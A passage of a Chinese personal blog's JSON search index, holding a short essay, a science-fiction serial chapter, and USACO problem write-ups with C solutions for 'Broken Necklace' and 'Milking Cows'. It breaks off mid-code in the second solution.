[
  
    {
      "title"    : "为梦起航",
      "category" : "",
      "tags"     : "随笔",
      "url"      : "/jekyll/update/2017/09/02/%E4%B8%BA%E6%A2%A6%E8%B5%B7%E8%88%AA.html",
      "date"     : "2017-09-02 10:26:00 +0800",
      "content"  : "<blockquote>\n  <p>剑已佩妥，从此仗剑天涯；酒已烫暖，</p>\n</blockquote>\n\n<p>  暑假，似乎并不能给我带来多少欢愉的心情。很快，就要开学了，我对暑假似乎有点留恋，但我更期待开学。\n  又到一年开学时分，一年的时光转瞬即逝。又到一年金秋时节，可努力！</p>\n"
    } ,
  
    {
      "title"    : "幕后 第五章",
      "category" : "",
      "tags"     : "幕后系列, 随笔",
      "url"      : "/jekyll/update/2017/08/31/%E5%B9%95%E5%90%8E-%E7%AC%AC%E4%BA%94%E7%AB%A0.html",
      "date"     : "2017-08-31 14:04:00 +0800",
      "content"  : "<p>坐标：中国东北-黑龙江鸭绿江沿岸某村庄 地球纪元2036年夏<br />\n这天，老大照旧出来打水。突然，不知怎么，整个地面一晃，老大一个不小心摔在了地上。<br />\n“嘿哟，咋整的，今个还摔了”，老大刚起身，提起水桶来抱怨道。然而，还没等他回过神来，又是一阵猛烈的摇晃。老大慌了身，在冰面上拖着被打湿的外套疯跑回屋。<br />\n老二与老三也在屋里感觉到了异样，慌得呆住了。见平日风光的老大惊慌失措地跑回，二人又回过神来，想笑又不敢。<br />\n三人就这样傻傻得呆在屋里，也没处好躲。<br />\n“是不是地震啊，哥？”，老三先说。<br />\n“也没个准哩。”老大替老二回答。<br />\n三人要是出了小屋就是冰面，真要地震起来，估摸着冰面撑不住。可试想一下，冬天松花江的水，谁受得了？不是被冻死就是淹死。</p>\n\n<p><br /></p>\n<hr />\n\n<p><br />\n坐标：比利时-布鲁塞尔-北约总部 地球纪元2035年冬<br />\n今天就要进行全部推进器的点火以及舰队的起航。<br />\n舰队分为三个梯队。有内而外分别为：核心保护舰队，近战保护舰队以及开拓舰队。其中进展舰队的武装力量是最强的，而核心保护舰队则分布在近地轨道，主要为防御职能。最后的开拓舰队没有固定队形，负责进行远处开拓，资源采集等任务。<br />\n三个梯队没有中心指挥，采用去中心化网络的模式通过庞大的舰队数量组建了高强度的通讯网络，直接由地面调度，当然，脱离了地面指挥三个梯队依旧可以联络。<br />\n舰队的起航方式必须有外而内起航。因为核心保护舰队的数量大，密度高。马克·瑟里奇和刘辉将在开拓舰队中指，他们也会是第一批进入太空舰队的人。<br />\n上午<code class=\"highlighter-rouge\">9：45</code>，开拓舰队主舰起航。主舰在夏威夷空军基地滑翔起飞，使用垂直推进器拉高高度。五个核推进器稳定且高速地拉升整舰，很快就达到了<code class=\"highlighter-rouge\">11.2km/s</code>逃逸速度。达到逃逸速度之后，舰船的阻力为0，而全舰的升空速度却一直在指数级别的攀升。这时候舰长必须马上关闭推进器并启动反向推进器来保证飞船不会偏离。而这一刻是最令人难受的时刻。全舰的人瞬间受到了一个巨大的反作用力，要不是大家都坐在缓冲座椅上，估计人都散了架。<br />\n终于到达预计轨道了，大家缓了缓，向地面开始汇报数据与情况。<br />\n很快，全球各地的军事基地中的开拓舰船都陆续起航。随着一艘艘舰船的升空。决定人类命运的时刻开始了。<br />\n“所有开拓舰船部署完毕！”，舰长向地面汇报。<br />\n“全体近战保护舰队的舰船注意，我们将在3分钟内起飞。”。\n三分钟之内，具有强大武装实力的近战舰队高速起飞。巨大的舰船遮挡了地球上大部分的天空。随着加速，舰船缓缓达到了逃逸速度，并进行了悬停。<br />\n“近战舰队部署完毕！”\n“进行联合机位调整”，地面回应。<br />\n随即，两个舰队就进行了计算并重新规划了轨道据地距离。<br />\n机位调整完成后，就是核心保护舰队的升空了。密集的舰队黑压压地上升地近地轨道。所有舰船全部采用了高密度合金。<br />\n为了维持光照，核心保护舰队的近地面进行了反光。</p>\n\n<p><br /></p>\n<hr />\n\n<p><br />\n坐标：开拓舰队-主舰船 地球纪元2036年初春<br />\n“现在的能量来源应该足够了，我们可以开启曲速引擎了吧”马克·瑟里奇说。<br />\n“但是一旦开启进行时空扭曲，GN-z11人就可能发现我们，同样很危险啊。”刘辉说。<br />\n“那就使用概率云吧，可是我们也无法做到把曲速引擎放到概率云里。”\n“也就是只能保证我们不被发现，但是曲速引擎是保不住？”\n“是的，也就是必须作出牺牲，而且动作要迅速”马克说。\n“可是我们怎么可能做到快速得预热引擎？曲速引擎启动到满速需要很长时间”\n“我们可以先内部预热，用概率云包裹，这样他们就不知道，然后我们再在去除概率云的一瞬间启动核动力推进器。”马克回答道。</p>\n\n<p>刘辉这次没有说话，想了想，点了点头就去通讯室了。<br />\n刘辉走进通讯室，向地面北约总部报告了想法，并请求尽快答复。</p>\n\n<p><br /></p>\n<hr />\n\n<p><br />\n（未完待续）\n<br /></p>\n"
    } ,
  
    {
      "title"    : "USACO Broken Necklace",
      "category" : "",
      "tags"     : "编程, 算法, OI, USACO",
      "url"      : "/jekyll/update/2017/08/31/USACO-Broken-Necklace.html",
      "date"     : "2017-08-31 11:14:00 +0800",
      "content"  : "<blockquote>\n  <p>USACO Broken Necklace题解分析</p>\n</blockquote>\n\n<p>1.题目</p>\n\n<ul>\n  <li>Description<br />\nYou have a necklace of N red, white, or blue beads (3&lt;=N&lt;=350) some of which are red, others blue, and others white, arranged at random. Here are two examples for n=29:\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>\n              1 2                               1 2  \n          r b b r                           b r r b  \n        r         b                       b         b  \n       r           r                     b           r  \n      r             r                   w             r  \n     b               r                 w               w  \n    b                 b               r                 r  \n    b                 b               b                 b  \n    b                 b               r                 b  \n     r               r                 b               r  \n      b             r                   r             r  \n       b           r                     r           r  \n         r       r                         r       b  \n           r b r                             r r w  \n          Figure A                         Figure B  \n                      r red bead  \n                      b blue bead  \n                      w white bead  \n</code></pre>\n    </div>\n    <p>The beads considered first and second in the text that follows have been marked in the picture.<br />\nThe configuration in Figure A may be represented as a string of b’s and r’s, where b represents a blue bead and r represents a red one, as follows: brbrrrbbbrrrrrbrrbbrbbbbrrrrb .<br />\nSuppose you are to break the necklace at some point, lay it out straight, and then collect beads of the same color from one end until you reach a bead of a different color, and do the same for the other end (which might not be of the same color as the beads collected before this).<br />\nDetermine the point where the necklace should be broken so that the most number of beads can be collected.</p>\n  </li>\n  <li>\n    <p>Example<br />\nFor example, for the necklace in Figure A, 8 beads can be collected, with the breaking point either between bead 9 and bead 10 or else between bead 24 and bead 25.<br />\nIn some necklaces, white beads had been included as shown in Figure B above. When collecting beads, a white bead that is encountered may be treated as either red or blue and then painted with the desired color. The string that represents this configuration can include any of the three symbols r, b and w.<br />\nWrite a program to determine the largest number of beads that can be collected from a supplied necklace.</p>\n  </li>\n  <li>INPUT FORMAT<br />\nLine 1:\tN, the number of beads<br />\nLine 2:\ta string of N characters, each of which is r, b, or w<br />\nSAMPLE INPUT (file beads.in)\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>29\nwwwbbrwrbrbrrbrbrwrwwrbwrwrrb\n</code></pre>\n    </div>\n  </li>\n  <li>OUTPUT FORMAT<br />\nA single line containing the maximum of number of beads that can be collected from the supplied necklace.<br />\nSAMPLE OUTPUT (file beads.out)\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>11\n</code></pre>\n    </div>\n  </li>\n  <li>OUTPUT EXPLANATION<br />\nConsider two copies of the beads (kind of like being able to runaround the ends). The string of 11 is marked.\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>              Two necklace copies joined here\n                           v\nwwwbbrwrbrbrrbrbrwrwwrbwrwrrb|wwwbbrwrbrbrrbrbrwrwwrbwrwrrb\n                     ******|*****\n                     rrrrrb|bbbbb  &lt;-- assignments\n                 5xr .....#|#####  6xb\n\n                      5+6 = 11 total\n</code></pre>\n    </div>\n    <p><br /></p>\n  </li>\n</ul>\n<hr />\n\n<p>2.思路与想法<br />\n题目的OUTPUT EXPLANATION已经给我们了提示，需要将字符串*2形成环状效果。<br />\n本题的解法就是枚举。对所有的切口进行枚举，设切口的左边bead为p，那么从p+n开始往左数，为pre；以p+1开始向右数为post。<br />\n如下，necklace为<code class=\"highlighter-rouge\">wrwwwwrwrbbbw</code>,设切口在第3个与第四个bead之间，那么p=3。</p>\n<div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>        pre的范围\n  切口      v   p+n\n   v ~~~~~~~~~~~v\nwrw|wwwrwrbbbwwrwwwwrwrbbbw\n    ^\n    p+1 (post的范围为p+1到pre的范围)\n</code></pre>\n</div>\n<p>为保证最终结果&lt;=n，所以必须确定范围。范围如上图所示。可以证明pre+post&lt;=n（最大为p+n-p-1+1)<br />\n有一个小的点需要注意。就是如果切口处向左或向右为w(white)的情况。<br />\n这种情况下，你需要painted with the desired color，也就是说，在循环的过程中寻找第一个不是w的bead并且将w涂上它的颜色。虽然你不考虑这个，进行一些其他的考虑也能AC，但是算法是错的，AC也没有什么意义。<br />\n<br /></p>\n<hr />\n\n<p>C程序实现：</p>\n<div class=\"language-c highlighter-rouge\"><pre class=\"highlight\"><code><span class=\"cm\">/*\nID: lexugey1\nLANG: C\nPROG: beads\n*/</span>\n<span class=\"cp\">#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n</span>\n<span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"kt\">char</span> <span class=\"n\">s</span><span class=\"p\">[</span><span class=\"mi\">350</span><span class=\"p\">],</span><span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"mi\">700</span><span class=\"p\">];</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">get_beads</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">p</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">pre</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">post</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">j</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">flag</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"n\">p</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">j</span><span class=\"o\">=</span><span class=\"n\">p</span><span class=\"o\">+</span><span class=\"n\">n</span><span class=\"p\">;</span>\n  <span class=\"kt\">char</span> <span class=\"n\">c</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n\n  <span class=\"n\">c</span><span class=\"o\">=</span><span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"n\">j</span><span class=\"p\">];</span>\n  <span class=\"k\">while</span> <span class=\"p\">((</span><span class=\"n\">flag</span><span class=\"o\">==</span><span class=\"mi\">0</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">j</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"o\">&gt;</span><span class=\"n\">p</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">))</span>\n  <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">c</span><span class=\"o\">==</span><span class=\"sc\">'w'</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"n\">j</span><span class=\"p\">]</span><span class=\"o\">!=</span><span class=\"sc\">'w'</span><span class=\"p\">))</span> <span class=\"n\">c</span><span class=\"o\">=</span><span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"n\">j</span><span class=\"p\">];</span> <span class=\"c1\">//涂色处理\n</span>    <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"n\">j</span><span class=\"p\">]</span><span class=\"o\">==</span><span class=\"n\">c</span><span class=\"p\">)</span><span class=\"o\">||</span><span class=\"p\">(</span><span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"n\">j</span><span class=\"p\">]</span><span class=\"o\">==</span><span class=\"sc\">'w'</span><span class=\"p\">))</span> <span class=\"n\">pre</span><span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"k\">else</span> <span class=\"n\">flag</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"n\">j</span><span class=\"o\">--</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"n\">j</span><span class=\"o\">++</span><span class=\"p\">;</span>\n  <span class=\"n\">c</span><span class=\"o\">=</span><span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">];</span>\n  <span class=\"n\">flag</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"k\">while</span> <span class=\"p\">((</span><span class=\"n\">flag</span><span class=\"o\">==</span><span class=\"mi\">0</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"n\">j</span><span class=\"p\">))</span>\n  <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">c</span><span class=\"o\">==</span><span class=\"sc\">'w'</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">!=</span><span class=\"sc\">'w'</span><span class=\"p\">))</span> <span class=\"n\">c</span><span class=\"o\">=</span><span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">];</span> <span class=\"c1\">//涂色处理\n</span>    <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">==</span><span class=\"n\">c</span><span class=\"p\">)</span><span class=\"o\">||</span><span class=\"p\">(</span><span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">==</span><span class=\"sc\">'w'</span><span class=\"p\">))</span> <span class=\"n\">post</span><span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"k\">else</span> <span class=\"n\">flag</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">return</span> <span class=\"n\">pre</span><span class=\"o\">+</span><span class=\"n\">post</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">main</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">max</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n\n  <span class=\"kt\">FILE</span> <span class=\"o\">*</span><span class=\"n\">fin</span>  <span class=\"o\">=</span> <span class=\"n\">fopen</span> <span class=\"p\">(</span><span class=\"s\">\"beads.in\"</span><span class=\"p\">,</span> <span class=\"s\">\"r\"</span><span class=\"p\">);</span>\n  <span class=\"kt\">FILE</span> <span class=\"o\">*</span><span class=\"n\">fout</span> <span class=\"o\">=</span> <span class=\"n\">fopen</span> <span class=\"p\">(</span><span class=\"s\">\"beads.out\"</span><span class=\"p\">,</span> <span class=\"s\">\"w\"</span><span class=\"p\">);</span>\n  <span class=\"c1\">// FILE *fin  = stdin;\n</span>  <span class=\"c1\">// FILE *fout = stdout;\n</span>\n  <span class=\"n\">fscanf</span><span class=\"p\">(</span><span class=\"n\">fin</span><span class=\"p\">,</span><span class=\"s\">\"%d\"</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">n</span><span class=\"p\">);</span>\n  <span class=\"n\">fscanf</span><span class=\"p\">(</span><span class=\"n\">fin</span><span class=\"p\">,</span><span class=\"s\">\"%s\"</span><span class=\"p\">,</span> <span class=\"n\">s</span><span class=\"p\">);</span>\n  <span class=\"n\">strcat</span><span class=\"p\">(</span><span class=\"n\">s1</span><span class=\"p\">,</span><span class=\"n\">s</span><span class=\"p\">);</span>\n  <span class=\"n\">strcat</span><span class=\"p\">(</span><span class=\"n\">s1</span><span class=\"p\">,</span><span class=\"n\">s</span><span class=\"p\">);</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"n\">n</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">get_beads</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">)</span><span class=\"o\">&gt;</span><span class=\"n\">max</span><span class=\"p\">)</span> <span class=\"n\">max</span><span class=\"o\">=</span><span class=\"n\">get_beads</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n  <span class=\"n\">fprintf</span><span class=\"p\">(</span><span class=\"n\">fout</span><span class=\"p\">,</span><span class=\"s\">\"%d</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span> <span class=\"n\">max</span><span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n</code></pre>\n</div>\n"
    } ,
  
    {
      "title"    : "USACO Milking Cows",
      "category" : "",
      "tags"     : "编程, 算法, OI, USACO",
      "url"      : "/jekyll/update/2017/08/31/USACO-Milking-Cows.html",
      "date"     : "2017-08-31 10:26:00 +0800",
      "content"  : "<blockquote>\n  <p>USACO Milking Cows题解分析</p>\n</blockquote>\n\n<ol>\n  <li>题目：\n    <ul>\n      <li>DESCRIPTION<br />\nThree farmers rise at 5 am each morning and head for the barn to milk three cows. The first farmer begins milking his cow at time 300 (measured in seconds after 5 am) and ends at time 1000. The second farmer begins at time 700 and ends at time 1200. The third farmer begins at time 1500 and ends at time 2100. The longest continuous time during which at least one farmer was milking a cow was 900 seconds (from 300 to 1200). The longest time no milking was done, between the beginning and the ending of all milking, was 300 seconds (1500 minus 1200).<br />\nYour job is to write a program that will examine a list of beginning and ending times for N (1 &lt;= N &lt;= 5000) farmers milking N cows and compute (in seconds):<br />\nThe longest time interval at least one cow was milked.<br />\nThe longest time interval (after milking starts) during which no cows were being milked.</li>\n      <li>INPUT FORMAT<br />\nLine 1:\tThe single integer, N<br />\nLines 2..N+1:\tTwo non-negative integers less than 1,000,000, respectively the starting and ending time in seconds after 0500<br />\nSAMPLE INPUT (file milk2.in)\n        <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>3  \n300 1000  \n700 1200  \n1500 2100  \n</code></pre>\n        </div>\n      </li>\n      <li>OUTPUT FORMAT<br />\nA single line with two integers that represent the longest continuous time of milking and the longest idle time.<br />\nSAMPLE OUTPUT (file milk2.out)\n        <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>900 300\n</code></pre>\n        </div>\n      </li>\n    </ul>\n  </li>\n  <li>思路与想法<br />\n可以把Milking Time想象为线段，你就可以直观感受到这到题目的大概思路：<br />\n对输入的线段与现有线段进行判断，能否合并，如果可以就合并并继续，如果不可以就进行两个答案存取并继续<br />\n如果只是单纯的实现这个解法，你就会在这个测试数据面前WA：\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>------- test 1 [length 10 bytes] ----\n1\n100 200\n</code></pre>\n    </div>\n    <p>当然解决方案也很简单，就只需要在最后循环结束时再进行一次答案存取即可。<br />\n但实际上这个想法还有有缺陷，我们来看测试数据：</p>\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>------- test 3 [length 54 bytes] ----\n10\n2 3\n4 5\n6 7\n8 9\n10 11\n12 13\n14 15\n16 17\n18 19\n1 20\n</code></pre>\n    </div>\n    <p>前面的数据全都没问题，但是最后的<code class=\"highlighter-rouge\">1 20</code>就会使得no cows were being milked的时间段变为0。但显然之前的解法会输出<code class=\"highlighter-rouge\">19 1</code>。怎么办呢？<br />\n我前后进行过多种方法的变换。但实际上，只需要按照开始时间排序即可。<br />\n为什么排序就可以解决这个问题？因为排序之后你会按照顺序处理，如果你的线段无法合并，那后面一定不会出现数据再来覆盖这一段，也就保证了这样的致命问题不会出现。<br />\n当然，这道题还有一个坑，就是你必须使用快速排序及以上的高速排序算法。因为最后的测试数据很大。<br />\n<br /></p>\n  </li>\n</ol>\n<hr />\n\n<p>C程序实现：（这段代码是没有fclose，在竞赛时切勿这样，我是参照USACO的写法，所以没有fclose）</p>\n<div class=\"language-c highlighter-rouge\"><pre class=\"highlight\"><code><span class=\"cm\">/*\nID: lexugey1\nLANG: C\nPROG: milk2\n*/</span>\n<span class=\"cp\">#include &lt;stdio.h&gt;\n</span>\n<span class=\"k\">struct</span> <span class=\"n\">xy</span> <span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"p\">;</span>\n  <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"p\">;</span>\n<span class=\"p\">};</span>\n<span class=\"k\">struct</span> <span class=\"n\">xy</span> <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"mi\">5001</span><span class=\"p\">];</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">swap</span><span class=\"p\">(</span><span class=\"k\">struct</span> <span class=\"n\">xy</span> <span class=\"o\">*</span><span class=\"n\">a</span><span class=\"p\">,</span><span class=\"k\">struct</span> <span class=\"n\">xy</span> <span class=\"o\">*</span><span class=\"n\">b</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"k\">struct</span> <span class=\"n\">xy</span> <span class=\"n\">t</span><span class=\"p\">;</span>\n  <span class=\"n\">t</span><span class=\"o\">=*</span><span class=\"n\">a</span><span class=\"p\">;</span>\n  <span class=\"o\">*</span><span class=\"n\">a</span><span class=\"o\">=*</span><span class=\"n\">b</span><span class=\"p\">;</span>\n  <span class=\"o\">*</span><span class=\"n\">b</span><span class=\"o\">=</span><span class=\"n\">t</span><span class=\"p\">;</span>\n  <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">Partition</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">first</span><span class=\"p\">,</span> <span class=\"kt\">int</span> <span class=\"n\">end</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"n\">first</span><span class=\"p\">,</span><span class=\"n\">j</span><span class=\"o\">=</span><span class=\"n\">end</span><span class=\"p\">;</span>\n  <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"n\">j</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"n\">j</span><span class=\"o\">&amp;&amp;</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"o\">&lt;=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">j</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"p\">)</span> <span class=\"n\">j</span><span class=\"o\">--</span><span class=\"p\">;</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"n\">j</span><span class=\"p\">)</span>\n    <span class=\"p\">{</span>\n      <span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"o\">&amp;</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">],</span><span class=\"o\">&amp;</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">j</span><span class=\"p\">]);</span>\n      <span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"n\">j</span><span class=\"o\">&amp;&amp;</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"o\">&lt;=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">j</span><span class=\"p\">].</span><span class=\"n\">x</span><span class=\"p\">)</span> <span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">&lt;</span><span class=\"n\">j</span><span class=\"p\">)</span>\n    <span class=\"p\">{</span>\n      <span class=\"n\">swap</span><span class=\"p\">(</span><span class=\"o\">&amp;</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">],</span><span class=\"o\">&amp;</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">j</span><span class=\"p\">]);</span>\n      <span class=\"n\">j</span><span class=\"o\">--</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">return</span> <span class=\"n\">i</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">QuickSort</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">first</span><span class=\"p\">,</span> <span class=\"kt\">int</span> <span class=\"n\">end</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">first</span><span class=\"o\">&lt;</span><span class=\"n\">end</span><span class=\"p\">)</span>\n    <span class=\"p\">{</span>\n      <span class=\"kt\">int</span> <span class=\"n\">pivot</span><span class=\"o\">=</span><span class=\"n\">Partition</span><span class=\"p\">(</span><span class=\"n\">first</span><span class=\"p\">,</span><span class=\"n\">end</span><span class=\"p\">);</span>\n      <span class=\"n\">QuickSort</span><span class=\"p\">(</span><span class=\"n\">first</span><span class=\"p\">,</span><span class=\"n\">pivot</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n      <span class=\"n\">QuickSort</span><span class=\"p\">(</span><span class=\"n\">pivot</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"n\">end</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n\n\n<span class=\"kt\">int</span> <span class=\"nf\">min</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">a</span><span class=\"p\">,</span><span class=\"kt\">int</span> <span class=\"n\">b</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">a</span><span class=\"o\">&lt;</span><span class=\"n\">b</span><span class=\"p\">)</span> <span class=\"k\">return</span> <span class=\"n\">a</span><span class=\"p\">;</span>\n  <span class=\"k\">else</span> <span class=\"k\">return</span> <span class=\"n\">b</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">max</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">a</span><span class=\"p\">,</span><span class=\"kt\">int</span> <span class=\"n\">b</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">a</span><span class=\"o\">&gt;</span><span class=\"n\">b</span><span class=\"p\">)</span> <span class=\"k\">return</span> <span class=\"n\">a</span><span class=\"p\">;</span>\n  <span class=\"k\">else</span> <span class=\"k\">return</span> <span class=\"n\">b</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">main</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">n</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">max1</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">max2</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">p</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">q</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n\n  <span class=\"kt\">FILE</span> <span class=\"o\">*</span><span class=\"n\">fin</span>  <span class=\"o\">=</span> <span class=\"n\">fopen</span> <span class=\"p\">(</span><span class=\"s\">\"milk2.in\"</span><span class=\"p\">,</span> <span class=\"s\">\"r\"</span><span class=\"p\">);</span>\n  <span class=\"kt\">FILE</span> <span class=\"o\">*</span><span class=\"n\">fout</span> <span class=\"o\">=</span> <span class=\"n\">fopen</span> <span class=\"p\">(</span><span class=\"s\">\"milk2.out\"</span><span class=\"p\">,</span> <span class=\"s\">\"w\"</span><span class=\"p\">);</span>\n  <span class=\"c1\">// FILE *fin  = stdin;\n</span>  